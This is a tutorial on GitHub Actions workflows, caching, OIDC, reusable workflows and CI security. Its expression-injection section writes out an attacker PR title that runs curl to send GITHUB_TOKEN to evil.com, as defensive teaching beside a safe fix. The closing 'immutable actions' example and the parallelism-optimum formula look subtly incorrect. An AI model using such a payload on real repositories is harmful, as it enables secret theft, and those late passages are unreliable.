---
title: "GitHub Actions Deep Dive"
description: "Complete guide to GitHub Actions — workflows, matrix strategies, caching, OIDC authentication, reusable workflows, and self-hosted runners"
tags: [github-actions, ci-cd, workflows, automation, oidc]
difficulty: "intermediate"
prerequisites: [ci-cd-overview]
lastReviewed: "2026-03-18"
---

# GitHub Actions Deep Dive

## Why GitHub Actions Exists

Before GitHub Actions launched in 2019, teams using GitHub had to integrate external CI/CD services — Travis CI, CircleCI, Jenkins — each requiring separate configuration, authentication, and context switching. The fundamental problem was that the CI/CD system lived outside the code hosting platform, creating friction in the development loop.

GitHub Actions solved this by embedding CI/CD directly into the platform where code already lives. The key innovation was the **marketplace model** — allowing the community to build and share reusable action steps, creating a composable automation ecosystem.

### Historical Context

| Year | Event | Impact |
|------|-------|--------|
| 2019 | GitHub Actions public beta | First-party CI/CD on GitHub |
| 2020 | Self-hosted runners GA | Enterprise adoption begins |
| 2021 | Composite actions, reusable workflows | Pipeline-as-code maturity |
| 2022 | OIDC support, required workflows | Security-first CI/CD |
| 2023 | Larger runners, GPU runners | Compute parity with dedicated CI |
| 2024 | Arm runners, M-series macOS | Cross-platform native builds |
| 2025 | Immutable actions, attestations | Supply chain security |

## First Principles

### The Event-Driven Execution Model

GitHub Actions is fundamentally an **event-driven workflow engine**. Every execution begins with an event — a push, a pull request, a schedule, a repository dispatch, or a manual trigger.

```mermaid
graph LR
    subgraph "Events"
        E1[push]
        E2[pull_request]
        E3[schedule]
        E4[workflow_dispatch]
        E5[repository_dispatch]
        E6[release]
    end

    subgraph "Workflow Selection"
        WS[Event Matcher]
    end

    subgraph "Execution"
        W1[Workflow 1]
        W2[Workflow 2]
        J1[Job A]
        J2[Job B]
        J3[Job C]
        S1[Step 1]
        S2[Step 2]
        S3[Step 3]
    end

    E1 --> WS
    E2 --> WS
    E3 --> WS
    E4 --> WS
    E5 --> WS
    E6 --> WS

    WS --> W1
    WS --> W2
    W1 --> J1
    W1 --> J2
    W2 --> J3
    J1 --> S1
    J1 --> S2
    J2 --> S3
```

### The Execution Hierarchy

```
Workflow (.yml file)
├── Job 1 (runs on a runner — independent VM/container)
│   ├── Step 1 (action or shell command)
│   ├── Step 2
│   └── Step 3
├── Job 2 (parallel by default, or depends on Job 1)
│   ├── Step 1
│   └── Step 2
└── Job 3
```

**Key principles**:
- **Workflows** are triggered by events
- **Jobs** run on separate runners (isolated VMs) — they share nothing by default
- **Steps** run sequentially within a job, sharing the same filesystem and environment
- **Actions** are reusable units of automation (composite steps or JavaScript/Docker)

### Expression Syntax and Context Objects

GitHub Actions uses a powerful expression language accessible via `${​{ ... }}` syntax (note: in the actual YAML files). The context objects available are:

| Context | Contents | Example |
|---------|----------|---------|
| `github` | Event payload, repository, actor | `github.event.pull_request.number` |
| `env` | Environment variables | `env.NODE_VERSION` |
| `vars` | Repository/org variables | `vars.DEPLOY_REGION` |
| `secrets` | Encrypted secrets | `secrets.AWS_ACCESS_KEY` |
| `job` | Current job info | `job.status` |
| `steps` | Step outputs | `steps.build.outputs.tag` |
| `runner` | Runner info | `runner.os`, `runner.arch` |
| `matrix` | Matrix values | `matrix.node-version` |
| `needs` | Dependent job outputs | `needs.build.outputs.image` |
| `inputs` | Workflow inputs | `inputs.environment` |
| `strategy` | Matrix strategy | `strategy.job-index` |

## Core Mechanics

### Workflow Triggers In Depth

```yaml
on:
  # Push events
  push:
    branches: [main, 'release/**']
    tags: ['v*']
    paths:
      - 'src/**'
      - 'package.json'
    paths-ignore:
      - 'docs/**'
      - '*.md'

  # Pull request events
  pull_request:
    types: [opened, synchronize, reopened]
    branches: [main]

  # Scheduled (cron)
  schedule:
    - cron: '0 2 * * 1-5'  # Weekdays at 2 AM UTC

  # Manual trigger with inputs
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options: [staging, production]
      dry-run:
        description: 'Dry run only'
        type: boolean
        default: false

  # API trigger
  repository_dispatch:
    types: [deploy-event]

  # On release
  release:
    types: [published]

  # Merge queue
  merge_group:
    types: [checks_requested]
```

### Activity Types Deep Dive

Each event has specific activity types that control when a workflow triggers:

```yaml
on:
  issues:
    types: [opened, labeled, assigned]
  pull_request:
    types:
      - opened        # PR created
      - synchronize   # New commit pushed
      - reopened       # PR reopened
      - ready_for_review  # Draft -> ready
      - labeled        # Label added
  pull_request_review:
    types: [submitted, dismissed]
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]
```

### Matrix Strategy

Matrix strategies allow running the same job across multiple configurations:

```yaml
jobs:
  test:
    runs-on: ${​{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node-version: [18, 20, 22]
        include:
          # Add specific combination
          - os: ubuntu-latest
            node-version: 22
            coverage: true
        exclude:
          # Remove specific combination
          - os: windows-latest
            node-version: 18
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${​{ matrix.node-version }}
      - run: npm ci
      - run: npm test
      - if: matrix.coverage
        run: npm run test:coverage
```

**Matrix expansion**: With 3 OS x 3 Node versions (minus 1 exclusion), this generates 8 parallel jobs. The total matrix size is:

$$
|\text{Matrix}| = \prod_{i=1}^{n} |D_i| - |\text{Excludes}| + |\text{Includes}|
$$

Where $|D_i|$ is the cardinality of each dimension.

### Dynamic Matrix Generation

For advanced use cases, generate the matrix dynamically:

```yaml
jobs:
  generate-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${​{ steps.set-matrix.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
      - id: set-matrix
        run: |
          # Detect changed packages in monorepo
          CHANGED=$(git diff --name-only HEAD~1 HEAD | \
            grep -oP '^packages/\K[^/]+' | sort -u | \
            jq -R -s -c 'split("\n") | map(select(length > 0))')
          echo "matrix={\"package\":${CHANGED}}" >> "$GITHUB_OUTPUT"

  test:
    needs: generate-matrix
    if: needs.generate-matrix.outputs.matrix != '{"package":[]}'
    runs-on: ubuntu-latest
    strategy:
      matrix: ${​{ fromJson(needs.generate-matrix.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - run: npm test --workspace=packages/${​{ matrix.package }}
```

### Caching Deep Dive

Caching is critical for performance. GitHub Actions provides two mechanisms: `actions/cache` and built-in tool caching.

```yaml
# Approach 1: Explicit cache action
- uses: actions/cache@v4
  id: npm-cache
  with:
    path: |
      ~/.npm
      node_modules
    key: npm-${​{ runner.os }}-${​{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${​{ runner.os }}-

# Check if cache was hit
- if: steps.npm-cache.outputs.cache-hit != 'true'
  run: npm ci

# Approach 2: Built-in tool cache (preferred)
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: 'npm'  # Automatically caches ~/.npm

# Approach 3: Docker layer caching
- uses: docker/build-push-action@v5
  with:
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

**Cache limits and behavior**:

| Property | Value |
|----------|-------|
| Maximum cache size (per entry) | 10 GB |
| Maximum total cache (per repo) | 10 GB |
| Cache retention | 7 days (unused) |
| Cache scope | Branch-based (fallback to default branch) |
| Cache isolation | Per-repository |
| Eviction policy | LRU when over 10 GB limit |

**Cache scope resolution order**:

```mermaid
graph TD
    A[Cache Lookup] --> B{Exact key match on current branch?}
    B -->|Yes| C[Cache Hit]
    B -->|No| D{Restore key match on current branch?}
    D -->|Yes| E[Partial Cache Hit]
    D -->|No| F{Exact key match on default branch?}
    F -->|Yes| G[Cache Hit from default]
    F -->|No| H{Restore key match on default branch?}
    H -->|Yes| I[Partial Cache Hit from default]
    H -->|No| J[Cache Miss]
```

### OIDC Authentication (Keyless Cloud Auth)

OIDC eliminates the need for long-lived cloud credentials in CI/CD. Instead, GitHub's OIDC provider issues short-lived JWT tokens that cloud providers validate.

```mermaid
sequenceDiagram
    participant GHA as GitHub Actions
    participant OIDC as GitHub OIDC Provider
    participant STS as AWS STS
    participant AWS as AWS Services

    GHA->>OIDC: Request JWT token
    OIDC->>GHA: JWT (sub: repo:org/repo:ref:refs/heads/main)
    GHA->>STS: AssumeRoleWithWebIdentity(JWT)
    STS->>STS: Validate JWT signature
    STS->>STS: Check trust policy conditions
    STS->>GHA: Temporary credentials (15min-1hr)
    GHA->>AWS: API calls with temp credentials
```

**Implementation for AWS**:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # Required for OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4

      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions
          aws-region: us-east-1
          role-session-name: github-actions-${​{ github.run_id }}

      - run: aws sts get-caller-identity  # Verify credentials work
      - run: aws s3 cp dist/ s3://my-bucket/ --recursive
```

**AWS IAM trust policy for OIDC**:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

::: warning
Always restrict OIDC trust policies with conditions. Without the `sub` claim condition, any GitHub Actions workflow in any repository could assume your IAM role.
:::

### Reusable Workflows

Reusable workflows allow defining pipeline logic once and calling it from multiple repositories:

```yaml
# .github/workflows/reusable-deploy.yml (in shared repo)
name: Reusable Deploy Workflow

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      image-tag:
        required: true
        type: string
      cluster:
        required: false
        type: string
        default: 'main-cluster'
    secrets:
      KUBECONFIG:
        required: true
    outputs:
      deploy-url:
        description: 'The deployment URL'
        value: ${​{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${​{ inputs.environment }}
    outputs:
      url: ${​{ steps.deploy.outputs.url }}
    steps:
      - uses: actions/checkout@v4

      - name: Configure kubectl
        run: |
          echo "${​{ secrets.KUBECONFIG }}" > /tmp/kubeconfig
          echo "KUBECONFIG=/tmp/kubeconfig" >> "$GITHUB_ENV"

      - name: Deploy
        id: deploy
        run: |
          kubectl set image deployment/app \
            app=${​{ inputs.image-tag }} \
            --namespace=${​{ inputs.environment }}
          kubectl rollout status deployment/app \
            --namespace=${​{ inputs.environment }} \
            --timeout=300s
          URL=$(kubectl get ingress -n ${​{ inputs.environment }} -o jsonpath='{.items[0].spec.rules[0].host}')
          echo "url=https://${URL}" >> "$GITHUB_OUTPUT"

      - name: Smoke test
        run: |
          curl --fail --retry 5 --retry-delay 10 ${​{ steps.deploy.outputs.url }}/health
```

**Calling the reusable workflow**:

```yaml
# .github/workflows/deploy.yml (in consuming repo)
name: Deploy

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${​{ steps.build.outputs.tag }}
    steps:
      - uses: actions/checkout@v4
      - id: build
        run: echo "tag=ghcr.io/my-org/app:${​{ github.sha }}" >> "$GITHUB_OUTPUT"

  deploy-staging:
    needs: build
    uses: my-org/shared-workflows/.github/workflows/reusable-deploy.yml@v2
    with:
      environment: staging
      image-tag: ${​{ needs.build.outputs.image-tag }}
    secrets:
      KUBECONFIG: ${​{ secrets.STAGING_KUBECONFIG }}

  deploy-production:
    needs: [build, deploy-staging]
    uses: my-org/shared-workflows/.github/workflows/reusable-deploy.yml@v2
    with:
      environment: production
      image-tag: ${​{ needs.build.outputs.image-tag }}
    secrets:
      KUBECONFIG: ${​{ secrets.PRODUCTION_KUBECONFIG }}
```

### Composite Actions

Composite actions bundle multiple steps into a single reusable action:

```yaml
# .github/actions/setup-project/action.yml
name: 'Setup Project'
description: 'Install dependencies and setup tooling'

inputs:
  node-version:
    description: 'Node.js version'
    required: false
    default: '20'
  install-playwright:
    description: 'Install Playwright browsers'
    required: false
    default: 'false'

outputs:
  cache-hit:
    description: 'Whether dependencies were cached'
    value: ${​{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${​{ inputs.node-version }}

    - name: Get npm cache directory
      id: npm-cache-dir
      shell: bash
      run: echo "dir=$(npm config get cache)" >> "$GITHUB_OUTPUT"

    - uses: actions/cache@v4
      id: cache
      with:
        path: |
          ${​{ steps.npm-cache-dir.outputs.dir }}
          node_modules
        key: npm-${​{ runner.os }}-${​{ hashFiles('**/package-lock.json') }}
        restore-keys: npm-${​{ runner.os }}-

    - name: Install dependencies
      if: steps.cache.outputs.cache-hit != 'true'
      shell: bash
      run: npm ci

    - name: Install Playwright
      if: inputs.install-playwright == 'true'
      shell: bash
      run: npx playwright install --with-deps chromium
```

## Implementation: Production-Grade Workflows

### Monorepo CI with Change Detection

```yaml
name: Monorepo CI

on:
  pull_request:
    branches: [main]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${​{ steps.changes.outputs.api }}
      web: ${​{ steps.changes.outputs.web }}
      shared: ${​{ steps.changes.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: changes
        with:
          filters: |
            api:
              - 'packages/api/**'
              - 'packages/shared/**'
            web:
              - 'packages/web/**'
              - 'packages/shared/**'
            shared:
              - 'packages/shared/**'

  test-api:
    needs: detect-changes
    if: needs.detect-changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: test
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-project
      - run: npm run test --workspace=packages/api
        env:
          DATABASE_URL: postgresql://postgres:test@localhost:5432/test

  test-web:
    needs: detect-changes
    if: needs.detect-changes.outputs.web == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-project
        with:
          install-playwright: 'true'
      - run: npm run test --workspace=packages/web
      - run: npm run test:e2e --workspace=packages/web
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: playwright-report
          path: packages/web/playwright-report/

  test-shared:
    needs: detect-changes
    if: needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-project
      - run: npm run test --workspace=packages/shared
```

### Release Workflow with Semantic Versioning

```yaml
name: Release

on:
  push:
    branches: [main]

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write
      id-token: write
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for changelog

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          registry-url: 'https://npm.pkg.github.com'

      - run: npm ci

      - name: Determine version bump
        id: version
        run: |
          # Analyze commits since last tag
          LAST_TAG=$(git describe --tags --abbrev=0 2>/dev/null || echo "v0.0.0")
          COMMITS=$(git log ${LAST_TAG}..HEAD --oneline)

          if echo "$COMMITS" | grep -qiE "^[a-f0-9]+ (feat|feature)(\(.*\))?!:"; then
            echo "bump=major" >> "$GITHUB_OUTPUT"
          elif echo "$COMMITS" | grep -qiE "^[a-f0-9]+ feat(\(.*\))?:"; then
            echo "bump=minor" >> "$GITHUB_OUTPUT"
          else
            echo "bump=patch" >> "$GITHUB_OUTPUT"
          fi

          echo "last-tag=${LAST_TAG}" >> "$GITHUB_OUTPUT"

      - name: Bump version
        id: bump
        run: |
          NEW_VERSION=$(npm version ${​{ steps.version.outputs.bump }} --no-git-tag-version)
          echo "version=${NEW_VERSION}" >> "$GITHUB_OUTPUT"

      - name: Build
        run: npm run build

      - name: Generate changelog
        id: changelog
        run: |
          LAST_TAG=${​{ steps.version.outputs.last-tag }}
          {
            echo "changelog<<EOF"
            git log ${LAST_TAG}..HEAD --pretty=format:"- %s (%h)" | head -50
            echo ""
            echo "EOF"
          } >> "$GITHUB_OUTPUT"

      - name: Create release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${​{ steps.bump.outputs.version }}
          name: Release ${​{ steps.bump.outputs.version }}
          body: |
            ## Changes
            ${​{ steps.changelog.outputs.changelog }}
          generate_release_notes: true

      - name: Publish to registry
        run: npm publish
        env:
          NODE_AUTH_TOKEN: ${​{ secrets.GITHUB_TOKEN }}
```

## Edge Cases & Failure Modes

### Common Pitfalls

| Pitfall | Description | Fix |
|---------|-------------|-----|
| `actions/checkout` depth | Default shallow clone breaks `git describe` | Use `fetch-depth: 0` when needing history |
| Secret masking bypass | Secrets encoded as base64 bypass masking | Never echo secrets; use `add-mask` for dynamic values |
| Concurrency race | Two deploys run simultaneously | Use `concurrency` groups with `cancel-in-progress` |
| Expression injection | Untrusted PR title in `run:` step | Use intermediate env vars, never inline expressions |
| Permissions escalation | `pull_request_target` runs with write access | Never check out PR code in `pull_request_target` |
| Cache poisoning | Attacker poisons cache from a PR | Cache keys include branch, review cache content |
| Fork restrictions | Forks can't access secrets | Use `pull_request_target` carefully for fork PRs |

### Security: Expression Injection Attack

::: danger
This is a real vulnerability class that has affected thousands of repositories.
:::

**Vulnerable workflow**:
```yaml
# DANGEROUS: PR title is attacker-controlled
- name: Greet
  run: |
    echo "PR title: ${​{ github.event.pull_request.title }}"
```

An attacker creates a PR with title: `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #`

**Safe approach**:
```yaml
# SAFE: Use environment variable (shell-quoted)
- name: Greet
  env:
    PR_TITLE: ${​{ github.event.pull_request.title }}
  run: |
    echo "PR title: ${PR_TITLE}"
```

### Handling Runner Failures

```yaml
jobs:
  resilient-job:
    runs-on: ubuntu-latest
    timeout-minutes: 30  # Never let jobs run forever
    steps:
      - uses: actions/checkout@v4

      - name: Flaky operation with retry
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 10
          max_attempts: 3
          retry_wait_seconds: 30
          command: npm run test:e2e

      - name: Always cleanup
        if: always()
        run: |
          docker system prune -f
          rm -rf /tmp/test-*

      - name: Notify on failure
        if: failure()
        run: |
          curl -X POST "${​{ secrets.SLACK_WEBHOOK }}" \
            -H 'Content-type: application/json' \
            -d "{\"text\":\"Pipeline failed: ${​{ github.server_url }}/${​{ github.repository }}/actions/runs/${​{ github.run_id }}\"}"
```

## Performance Characteristics

### Runner Specifications and Costs

| Runner Type | vCPU | RAM | Storage | Cost/min (Linux) | Cost/min (Windows) |
|-------------|------|-----|---------|-----------------|-------------------|
| Standard (2-core) | 2 | 7 GB | 14 GB SSD | $0.008 | $0.016 |
| Large (4-core) | 4 | 16 GB | 150 GB SSD | $0.016 | $0.032 |
| XLarge (8-core) | 8 | 32 GB | 300 GB SSD | $0.032 | $0.064 |
| 2XLarge (16-core) | 16 | 64 GB | 600 GB SSD | $0.064 | $0.128 |
| 4XLarge (32-core) | 32 | 128 GB | 840 GB SSD | $0.128 | $0.256 |
| 8XLarge (64-core) | 64 | 256 GB | 2040 GB SSD | $0.256 | $0.512 |
| macOS (M1) | 3 | 7 GB | 14 GB | $0.08 | — |
| macOS (M1 Large) | 12 | 30 GB | 14 GB | $0.12 | — |

### Optimization Benchmarks

| Optimization | Before | After | Improvement |
|-------------|--------|-------|-------------|
| npm cache | 90s install | 8s restore | 91% faster |
| Docker layer cache (GHA) | 120s build | 20s build | 83% faster |
| Shallow clone (large repo) | 45s clone | 3s clone | 93% faster |
| Test sharding (4x) | 240s tests | 65s tests | 73% faster |
| Turbo remote cache (monorepo) | 300s build | 30s build | 90% faster |
| Path filtering (monorepo) | 4 jobs always | 1-2 jobs targeted | 50-75% fewer minutes |

### Parallelism vs. Cost Tradeoff

$$
T_{\text{total}} = T_{\text{setup}} + \frac{T_{\text{work}}}{P} + T_{\text{teardown}}
$$

$$
C_{\text{total}} = P \times (T_{\text{setup}} + \frac{T_{\text{work}}}{P} + T_{\text{teardown}}) \times C_{\text{per-min}}
$$

Where $P$ is the parallelism factor. Increasing parallelism reduces wall-clock time but does not reduce cost (and may increase it due to duplicated setup/teardown). The sweet spot typically occurs at:

$$
P^* = \sqrt{\frac{T_{\text{work}}}{T_{\text{setup}} + T_{\text{teardown}}}}
$$

For a typical project with 4 minutes of setup/teardown and 16 minutes of test work, optimal parallelism is $P^* = \sqrt{16/4} = 2$. Going beyond this increases cost without proportional time savings.

## Mathematical Foundations

### Amdahl's Law Applied to CI/CD

Not all pipeline stages can be parallelized. Amdahl's Law gives the theoretical speedup:

$$
S(P) = \frac{1}{(1 - f) + \frac{f}{P}}
$$

Where $f$ is the fraction of work that can be parallelized and $P$ is the parallelism factor.

In a typical CI pipeline:
- Sequential (non-parallelizable): checkout (5%), build (15%), deploy (10%) = 30%
- Parallelizable: testing (70%)

$$
S(4) = \frac{1}{0.3 + \frac{0.7}{4}} = \frac{1}{0.3 + 0.175} = \frac{1}{0.475} \approx 2.1\times
$$

Even with infinite parallelism:

$$
S(\infty) = \frac{1}{0.3} \approx 3.3\times
$$

This means a 20-minute pipeline with 30% sequential work can never go below ~6 minutes regardless of how many runners you throw at it.

## Real-World War Stories

::: info War Story — The Codecov Supply Chain Attack (2021)
In April 2021, attackers compromised the popular `codecov/codecov-action` GitHub Action by injecting a malicious script into the Codecov Bash Uploader. For two months, the compromised action exfiltrated environment variables (including CI secrets and tokens) from every CI run that used it.

**Root cause**: The action downloaded a script from Codecov's servers at runtime. Attackers modified the server-side script after compromising Codecov's CI process (ironic).

**Impact**: Hundreds of organizations had their CI secrets exfiltrated, including HashiCorp, Twilio, and others.

**Lessons**:
1. Pin actions to full commit SHAs, not tags: `uses: codecov/codecov-action@e28ff129e5465c2c0dcc6f003fc735cb6ae0c673` instead of `@v3`
2. Restrict `GITHUB_TOKEN` permissions with the minimum required
3. Rotate secrets regularly — assume they've been compromised
4. Use OIDC instead of long-lived credentials
5. Review third-party actions before adopting
:::

::: info War Story — The 45-Minute PR Check
A SaaS company required all PR checks to pass before merging. Their E2E test suite grew to 45 minutes, which meant developers spent hours waiting for feedback. PRs started stacking up, merge conflicts multiplied, and developer productivity cratered.

**Fix**:
1. Identified that 60% of E2E tests were redundant with integration tests
2. Implemented test sharding across 8 parallel runners (45min to 8min)
3. Added predictive test selection — only running E2E tests affected by the changed code
4. Moved non-critical E2E tests to a post-merge workflow
5. Total PR check time: 45 minutes down to 6 minutes

**Lesson**: CI pipeline time is developer time. Every minute added to CI is multiplied by every developer, every PR, every day.
:::

## Decision Framework

### Self-Hosted vs. GitHub-Hosted Runners

| Factor | GitHub-Hosted | Self-Hosted |
|--------|--------------|-------------|
| Setup complexity | Zero | Medium-High |
| Maintenance | Zero | Ongoing |
| Security isolation | Excellent (ephemeral) | Must configure |
| Cost at scale | Expensive (>$5K/mo) | Cheaper |
| Custom software | Limited | Full control |
| Network access | Public only | Private VPC |
| Hardware options | Standard tiers | Any hardware |
| GPU support | Limited | Full |
| Startup time | 20-40s | 5-15s (warm) |
| Recommended for | Small-medium teams | Large teams, special requirements |

### Action Pinning Strategy

```yaml
# WORST: mutable tag, attacker can change
uses: actions/checkout@v4

# BETTER: specific version tag
uses: actions/checkout@v4.1.7

# BEST: immutable commit SHA
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.7

# FOR INTERNAL ACTIONS: semver tag is acceptable
uses: my-org/internal-action@v2
```

## Advanced Topics

### Custom GitHub Actions in TypeScript

```typescript
// src/index.ts — Custom GitHub Action
import * as core from '@actions/core';
import * as github from '@actions/github';
import * as exec from '@actions/exec';

interface DeployInputs {
  environment: string;
  imageTag: string;
  timeout: number;
  dryRun: boolean;
}

function getInputs(): DeployInputs {
  return {
    environment: core.getInput('environment', { required: true }),
    imageTag: core.getInput('image-tag', { required: true }),
    timeout: parseInt(core.getInput('timeout') || '300', 10),
    dryRun: core.getBooleanInput('dry-run'),
  };
}

async function run(): Promise<void> {
  const inputs = getInputs();

  core.info(`Deploying ${inputs.imageTag} to ${inputs.environment}`);

  // Create deployment status
  const octokit = github.getOctokit(core.getInput('token'));
  const { data: deployment } = await octokit.rest.repos.createDeployment({
    ...github.context.repo,
    ref: github.context.sha,
    environment: inputs.environment,
    auto_merge: false,
    required_contexts: [],
  });

  if (!('id' in deployment)) {
    core.setFailed('Failed to create deployment');
    return;
  }

  try {
    // Update status to in_progress
    await octokit.rest.repos.createDeploymentStatus({
      ...github.context.repo,
      deployment_id: deployment.id,
      state: 'in_progress',
    });

    if (inputs.dryRun) {
      core.info('Dry run mode — skipping actual deployment');
    } else {
      // Execute deployment
      await exec.exec('kubectl', [
        'set', 'image', 'deployment/app',
        `app=${inputs.imageTag}`,
        `--namespace=${inputs.environment}`,
      ]);

      // Wait for rollout
      await exec.exec('kubectl', [
        'rollout', 'status', 'deployment/app',
        `--namespace=${inputs.environment}`,
        `--timeout=${inputs.timeout}s`,
      ]);
    }

    // Mark deployment as success
    await octokit.rest.repos.createDeploymentStatus({
      ...github.context.repo,
      deployment_id: deployment.id,
      state: 'success',
      environment_url: `https://${inputs.environment}.example.com`,
    });

    core.setOutput('deployment-id', deployment.id.toString());
    core.setOutput('url', `https://${inputs.environment}.example.com`);
  } catch (error) {
    // Mark deployment as failure
    await octokit.rest.repos.createDeploymentStatus({
      ...github.context.repo,
      deployment_id: deployment.id,
      state: 'failure',
    });

    if (error instanceof Error) {
      core.setFailed(error.message);
    }
  }
}

run();
```

### Workflow Observability with OpenTelemetry

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Start trace
        id: trace
        run: |
          TRACE_ID=$(openssl rand -hex 16)
          SPAN_ID=$(openssl rand -hex 8)
          echo "trace-id=${TRACE_ID}" >> "$GITHUB_OUTPUT"
          echo "span-id=${SPAN_ID}" >> "$GITHUB_OUTPUT"
          echo "start-time=$(date +%s%N)" >> "$GITHUB_OUTPUT"

      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build
      - run: npm test

      - name: Report trace
        if: always()
        env:
          OTEL_ENDPOINT: ${​{ secrets.OTEL_ENDPOINT }}
        run: |
          END_TIME=$(date +%s%N)
          curl -X POST "${OTEL_ENDPOINT}/v1/traces" \
            -H "Content-Type: application/json" \
            -d "{
              \"resourceSpans\": [{
                \"resource\": {
                  \"attributes\": [
                    {\"key\": \"service.name\", \"value\": {\"stringValue\": \"ci-pipeline\"}},
                    {\"key\": \"github.repository\", \"value\": {\"stringValue\": \"${​{ github.repository }}\"}},
                    {\"key\": \"github.run_id\", \"value\": {\"stringValue\": \"${​{ github.run_id }}\"}}
                  ]
                },
                \"scopeSpans\": [{
                  \"spans\": [{
                    \"traceId\": \"${​{ steps.trace.outputs.trace-id }}\",
                    \"spanId\": \"${​{ steps.trace.outputs.span-id }}\",
                    \"name\": \"ci-build\",
                    \"startTimeUnixNano\": \"${​{ steps.trace.outputs.start-time }}\",
                    \"endTimeUnixNano\": \"${END_TIME}\",
                    \"status\": {\"code\": \"${​{ job.status == 'success' && '1' || '2' }}\"}
                  }]
                }]
              }]
            }"
```

### Self-Hosted Runner Autoscaling with Kubernetes

```yaml
# actions-runner-controller Helm values
controllerManager:
  replicaCount: 1

githubConfigUrl: "https://github.com/my-org"

containerMode:
  type: "kubernetes"
  kubernetesModeWorkVolumeClaim:
    accessModes: ["ReadWriteOnce"]
    storageClassName: "gp3"
    resources:
      requests:
        storage: 50Gi

template:
  spec:
    containers:
      - name: runner
        image: ghcr.io/actions/actions-runner:latest
        resources:
          requests:
            cpu: "2"
            memory: "4Gi"
          limits:
            cpu: "4"
            memory: "8Gi"

maxRunners: 20
minRunners: 2

listenerTemplate:
  spec:
    containers:
      - name: listener
        resources:
          requests:
            cpu: "100m"
            memory: "256Mi"
```

### GitHub Actions Immutable Actions (2025+)

The latest evolution pins actions to content-addressable hashes with attestation:

```yaml
# Using verified, attested actions
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with:
          attestation: required  # Verify Sigstore attestation

      - uses: actions/setup-node@v4
        with:
          node-version: '22'

      # Generate SLSA provenance
      - uses: slsa-framework/slsa-github-generator/.github/workflows/builder_nodejs_slsa3.yml@v2.0.0
        with:
          verified-token: ${​{ secrets.SLSA_TOKEN }}
```

This ensures that the action code has not been tampered with between when it was published and when your workflow consumes it.
